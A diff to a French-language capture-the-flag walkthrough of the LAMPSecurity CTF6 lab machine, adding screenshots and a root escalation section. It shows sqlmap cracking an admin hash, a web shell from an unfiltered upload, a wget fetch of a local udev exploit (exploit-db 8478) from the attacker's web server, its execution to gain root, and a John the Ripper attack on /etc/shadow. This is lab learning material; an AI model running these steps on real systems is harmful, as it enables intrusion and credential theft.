@@ -32,6 +32,7 @@ MAC Address: 08:00:08:00:08:00 (Oracle VirtualBox virtual NIC)
 Il est possible de [se connecter à distance avec SSH](https://en.wikipedia.org/wiki/Secure_Shell) au serveur LAMPSecurity CTF6 (port 22), un serveur Web Apache 2.2.3 (ports 80/443), une base de données MySQL (port 3306) et un serveur de messagerie électronique (ports 110/143/993/995) y sont installés. Pour chacun de ces services, il est désormais temps de partir à la chasse aux vulnérabilités.
 
 Le serveur Web semble a priori le plus alléchant pour commencer ; le site qu'il va falloir analyser de fond en comble est une plate-forme d'achat et de vente en ligne développée en PHP. Celle-ci est spécialisée dans les widgets, [mot anglais générique](https://fr.wiktionary.org/wiki/pantonyme) qui désigne des trucs, des machins, des bidules... un peu comme les mots magiques _[stuff](https://en.wiktionary.org/wiki/stuff)_ en anglais et _[schtroumpf](https://fr.wiktionary.org/wiki/schtroumpf)_ en français.
+![Affichage de l'image CTF6_user_view.png](images/CTF6_user_view.png)
 
 Quatre annonces y ont été publiées, numérotées de 1 à 4, mais il s'agit de [faux-texte](https://fr.wikipedia.org/wiki/Faux-texte). Les contacts de cinq salariés de Widgets Inc. figurent en page d'accueil, ces informations seront certainement très utiles par la suite : John Sloan - CEO, Linda Charm - Manager, Fred Beekman - Sales, Molly Steele - Assistant, Toby Victor - Technical.
 
@@ -122,8 +123,8 @@ what dictionary do you want to use?
 do you want to use common password suffixes? (slow!) [y/N] N
 [00:11:22] [INFO] starting dictionary-based cracking (md5_generic_passwd)
 [00:11:22] [INFO] starting 2 processes 
-[00:11:22] [INFO] cracked password 'adminpass' for hash '25e4ee4e9229397b6b17776bfceaf8e7'                                                 
-Database: cms                                                                                                                              
+[00:11:22] [INFO] cracked password 'adminpass' for hash '25e4ee4e9229397b6b17776bfceaf8e7'
+Database: cms
 Table: user
 [1 entry]
 +---------+---------------+----------------------------------------------+
@@ -440,6 +441,7 @@ back-end DBMS: MySQL >= 4.1
 ## Formulaire d'upload et reverse shell
 
 Le couple d'identifiants admin/adminpass permet de se connecter en tant qu'administrateur sur la plate-forme. Celui-ci a la possibilité de créer des articles sur le site, et d'y adjoindre une image via un formulaire d'upload. Or cette fonctionnalité n'est pas filtrée, car après plusieurs tests, on constate qu'aucune vérification n'est en place, sur l'extension ou le type du fichier.
+![Affichage de l'image CTF6_admin_view.png](images/CTF6_admin_view.png)
 
 Extrait du fichier add_event.php sur la fonctionnalité d'upload.
 
@@ -528,12 +530,110 @@ bash-3.2$
 
 ### Élévation de privilèges (root)
 
-...
+Après plusieurs essais infructueux, j'ai finalement réussi à passer root avec [cet exploit](https://www.exploit-db.com/exploits/8478/).
+
+Hop, un petit serveur Web pour mettre l'exploit (disponible également sur Kali) à disposition de la VM LampSecurity.
+
+```console
+root@blinils:~# cp /usr/share/exploitdb/exploits/linux/local/8478.sh 8478.sh
+root@blinils:~# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+Pendant ce temps, l'exploit est compilé avec gcc puis exécuté, et tadaaam... root !
+
+```console
+bash-3.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+bash-3.2$ ls
+ls
+drive-removable-media-ieee1394.png  redhat-home.png
+media-optical-bd.png		    shell.php
+palm-pilot.png			    stock_new-appointment.png
+redhat-applications.png
+
+bash-3.2$ wget http://192.168.56.102:8000/8478.sh -q
+wget http://192.168.56.102:8000/8478.sh -q
+
+bash-3.2$ ls
+ls
+8478.sh				    redhat-applications.png
+drive-removable-media-ieee1394.png  redhat-home.png
+media-optical-bd.png		    shell.php
+palm-pilot.png			    stock_new-appointment.png
+```
+
+Premier essai : raté, il faut ajouter la permission d'exécution au fichier.
+
+```console
+bash-3.2$ ./8478.sh
+./8478.sh
+bash: ./8478.sh: Permission denied
+bash-3.2$ chmod +x 8478.sh
+chmod +x 8478.sh
+```
+
+Deuxième essai : raté, il y a un petit souci de syntaxe facilement résoluble en une ligne de commande.
+
+```console
+bash-3.2$ ./8478.sh
+./8478.sh
+bash: ./8478.sh: /bin/sh^M: bad interpreter: No such file or directory
+bash-3.2$ sed -i -e 's/\r$//' 8478.sh
+sed -i -e 's/\r$//' 8478.sh
+```
+
+Troisième essai : il aurait fallu que je lise attentivement le modop de cet exploit.
+
+```console
+bash-3.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+bash-3.2$ ./8478.sh
+./8478.sh
+suid.c: In function 'main':
+suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
+/usr/bin/ld: cannot open output file /tmp/suid: Permission denied
+collect2: ld returned 1 exit status
+./8478.sh: line 131: 18439 Segmentation fault      /tmp/udev $1
+
+bash-3.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+
+En effet, il faut passer le PID du gestionnaire de périphériques _udev_ en paramètre du script.
+
+```console
+bash-3.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+bash-3.2$ ps -ef | grep udev
+ps -ef | grep udev
+root       379     1  0 07:10 ?        00:00:00 /sbin/udevd -d
+
+bash-3.2$ ./8478.sh 379
+./8478.sh 379
+suid.c: In function 'main':
+suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
+/usr/bin/ld: cannot open output file /tmp/suid: Permission denied
+collect2: ld returned 1 exit status
+sh-3.2#
+
+sh-3.2# id
+id
+uid=0(root) gid=0(root) groups=48(apache)
+```
+
+C'est gagné, nous sommes root !
 
 ### Attaque par dictionnaire avec John The Ripper sur le fichier /etc/shadow
 
-Le fichier /etc/shadow est particulièrement intéressant, car
-[il contient les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
+Pour conclure ce _walkthrough_, intéressons-nous au fichier /etc/shadow. Celui-ci contient [les mots de passe hashés de chaque compte Unix](https://fr.wikipedia.org/wiki/Passwd), ainsi que la date de la dernière modification du mot de passe ou encore la date d'expiration des comptes.
 L'outil John The Ripper est en mesure de [cracker les mots de passe Unix](https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html) si on lui fournit les fichiers /etc/passwd et /etc/shadow, comme suit...
 
 ```console
